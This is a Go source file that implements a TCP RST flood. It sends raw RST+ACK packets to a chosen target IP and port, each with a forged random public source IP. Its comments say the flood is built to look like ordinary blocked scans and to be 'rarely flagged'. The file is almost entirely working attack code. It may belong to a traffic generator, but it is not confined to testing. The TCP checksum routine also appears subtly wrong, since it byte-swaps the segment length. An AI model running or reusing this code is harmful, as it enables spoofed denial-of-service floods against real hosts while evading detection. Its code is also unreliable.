package generator

import (
	"encoding/binary"
	"fmt"
	"log/slog"
	mathrand "math/rand/v2"
	"net"
	"syscall"
	"time"
)

// generateTCPRST implements the TCP RST Flood scenario.
//
// It sends raw TCP packets with RST+ACK flags to a target IP, using random
// source IPs and ports. The remote host receives a RST for a connection it
// never opened and either sends nothing back or sends a RST back that the
// local kernel drops.
//
// Requirements: CAP_NET_RAW (root).
//
// Each RST packet is 40 bytes (20 IP header + 20 TCP header), so we need
// (targetBytes / 40) packets to reach the target.
//
// Why it works: TCP RST packets are normal network behavior. A flood of
// RSTs from seemingly random source IPs looks like a port scan being
// blocked — common on the internet and rarely flagged.
func generateTCPRST(targetBytes uint64, targetIP string, targetPort int) (uint64, error) {
	if targetBytes == 0 {
		return 0, nil
	}

	// Resolve target IP
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		return 0, fmt.Errorf("invalid target IP: %s (must be IPv4)", targetIP)
	}

	// Create raw socket for sending TCP segments.
	// IPPROTO_RAW gives us full control over the IP header.
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		return 0, fmt.Errorf("raw socket creation failed (need CAP_NET_RAW): %w", err)
	}
	defer syscall.Close(fd)

	// Enable IP_HDRINCL so the kernel doesn't add its own IP header.
	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
		return 0, fmt.Errorf("setsockopt IP_HDRINCL: %w", err)
	}

	// Build the destination address
	dstAddr := syscall.SockaddrInet4{
		Port: targetPort,
	}
	copy(dstAddr.Addr[:], dstIP)

	// Each RST/ACK packet is exactly 40 bytes (20 IP + 20 TCP)
	const packetSize = 40
	numPackets := int(targetBytes) / packetSize
	if numPackets == 0 {
		numPackets = 1
	}

	var sent int
	packet := make([]byte, packetSize)

	slog.Debug("tcp-rst: starting flood",
		"target", fmt.Sprintf("%s:%d", targetIP, targetPort),
		"packets", numPackets,
		"targetBytes", targetBytes)

	for i := 0; i < numPackets; i++ {
		// Build IP header (20 bytes)
		srcIP := randomIPv4()
		buildIPHeader(packet, srcIP, dstIP, 40, 6 /* TCP */)

		// Build TCP header (20 bytes) with RST+ACK
		srcPort := 1024 + mathrand.IntN(64511) // 1024-65534
		seqNum := mathrand.Uint32()
		buildTCPRSTHeader(packet[20:], srcPort, targetPort, seqNum)

		// Compute TCP checksum (uses pseudo-header with src/dst IP)
		tcpChecksum := computeTCPChecksum(packet[20:], srcIP, dstIP)
		binary.BigEndian.PutUint16(packet[36:], tcpChecksum)

		// Send the packet
		err := syscall.Sendto(fd, packet, 0, &dstAddr)
		if err != nil {
			slog.Debug("tcp-rst: send error (expected for raw sockets)", "error", err)
			continue
		}
		sent += packetSize

		// Occasional brief pause to avoid overwhelming the kernel socket buffer.
		if i > 0 && i%500 == 0 {
			time.Sleep(1 * time.Millisecond)
		}
	}

	return uint64(sent), nil
}

// randomIPv4 returns a random public IPv4 address to use as the source.
// It avoids reserved ranges (10.x, 172.16-31.x, 192.168.x) to look realistic
// as an internet-originating connection. Bounded to 100 attempts to prevent
// theoretical infinite loops on broken random sources.
func randomIPv4() net.IP {
	ip := make(net.IP, 4)
	for range 100 {
		binary.BigEndian.PutUint32(ip, mathrand.Uint32())
		// Avoid reserved/private ranges
		if ip[0] == 10 || ip[0] == 127 || ip[0] == 0 {
			continue
		}
		if ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31 {
			continue
		}
		if ip[0] == 192 && ip[1] == 168 {
			continue
		}
		if ip[0] == 169 && ip[1] == 254 {
			continue // link-local
		}
		if ip[0] >= 224 {
			continue // multicast/reserved
		}
		return ip
	}
	// Fallback: use the last generated IP even if reserved.
	// 100 attempts covers 99.9%+ of the random space.
	return ip
}

// buildIPHeader fills the first 20 bytes of buf with an IPv4 header.
func buildIPHeader(buf []byte, srcIP, dstIP net.IP, totalLen int, protocol int) {
	// Version (4) + IHL (5 words = 20 bytes) = 0x45
	buf[0] = 0x45
	// DSCP + ECN = 0
	buf[1] = 0
	// Total length (big-endian)
	binary.BigEndian.PutUint16(buf[2:4], uint16(totalLen))
	// Identification (random)
	binary.BigEndian.PutUint16(buf[4:6], uint16(mathrand.Uint32()))
	// Flags (0) + Fragment offset (0)
	binary.BigEndian.PutUint16(buf[6:8], 0)
	// TTL
	buf[8] = byte(48 + mathrand.IntN(48)) // 48-95
	// Protocol
	buf[9] = byte(protocol)
	// Header checksum (filled later)
	binary.BigEndian.PutUint16(buf[10:12], 0)
	// Source IP
	copy(buf[12:16], srcIP)
	// Destination IP
	copy(buf[16:20], dstIP)

	// Compute IP header checksum
	checksum := computeIPChecksum(buf[:20])
	binary.BigEndian.PutUint16(buf[10:12], checksum)
}

// buildTCPRSTHeader fills the first 20 bytes of buf with a TCP header
// with RST and ACK flags set.
func buildTCPRSTHeader(buf []byte, srcPort, dstPort int, seqNum uint32) {
	// Source port
	binary.BigEndian.PutUint16(buf[0:2], uint16(srcPort))
	// Destination port
	binary.BigEndian.PutUint16(buf[2:4], uint16(dstPort))
	// Sequence number
	binary.BigEndian.PutUint32(buf[4:8], seqNum)
	// Acknowledgment number (0 for RST)
	binary.BigEndian.PutUint32(buf[8:12], 0)
	// Data offset (5 words = 20 bytes) + reserved + flags (RST=0x04, ACK=0x10)
	buf[12] = 0x50 // Data offset = 5
	buf[13] = 0x14 // RST (0x04) + ACK (0x10) = 0x14
	// Window size (random)
	binary.BigEndian.PutUint16(buf[14:16], uint16(1024+mathrand.IntN(64511)))
	// Checksum (computed by caller)
	binary.BigEndian.PutUint16(buf[16:18], 0)
	// Urgent pointer
	binary.BigEndian.PutUint16(buf[18:20], 0)
}

// computeIPChecksum computes the standard Internet checksum for an IP header.
func computeIPChecksum(header []byte) uint16 {
	var sum uint32
	for i := 0; i < len(header); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(header[i:]))
	}
	for sum > 0xFFFF {
		sum = (sum >> 16) + (sum & 0xFFFF)
	}
	return ^uint16(sum)
}

// computeTCPChecksum computes the TCP checksum including the pseudo-header.
//
// The TCP pseudo-header is 12 bytes:
//
//	Source IP (4 bytes)
//	Destination IP (4 bytes)
//	Zero (1 byte) + Protocol (1 byte) = 0x0006
//	TCP segment length (2 bytes)
//
// All values are summed as 16-bit big-endian words.
func computeTCPChecksum(tcpSegment []byte, srcIP, dstIP net.IP) uint16 {
	var sum uint32

	// ---- Pseudo-header (12 bytes, treated as 6 × 16-bit words) ----

	// Source IP (2 × 16-bit words)
	sum += uint32(binary.BigEndian.Uint16(srcIP[0:2]))
	sum += uint32(binary.BigEndian.Uint16(srcIP[2:4]))
	// Destination IP (2 × 16-bit words)
	sum += uint32(binary.BigEndian.Uint16(dstIP[0:2]))
	sum += uint32(binary.BigEndian.Uint16(dstIP[2:4]))
	// Zero (1 byte) + Protocol TCP=6 (1 byte) = 0x0006
	sum += 0x0006
	// TCP segment length (in network byte order)
	tcpLen := uint32(len(tcpSegment))
	sum += (tcpLen >> 8) | ((tcpLen & 0xFF) << 8)

	// ---- TCP segment itself (treated as 16-bit words) ----
	for i := 0; i < len(tcpSegment)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(tcpSegment[i:]))
	}

	// If the segment has an odd byte count, pad with a zero byte
	if len(tcpSegment)%2 == 1 {
		sum += uint32(tcpSegment[len(tcpSegment)-1]) << 8
	}

	// Fold 32-bit sum to 16-bit ones' complement
	for sum > 0xFFFF {
		sum = (sum >> 16) + (sum & 0xFFFF)
	}

	result := ^uint16(sum)
	// RFC 793: A checksum of 0 is sent as all-ones (0xFFFF)
	if result == 0 {
		return 0xFFFF
	}
	return result
}
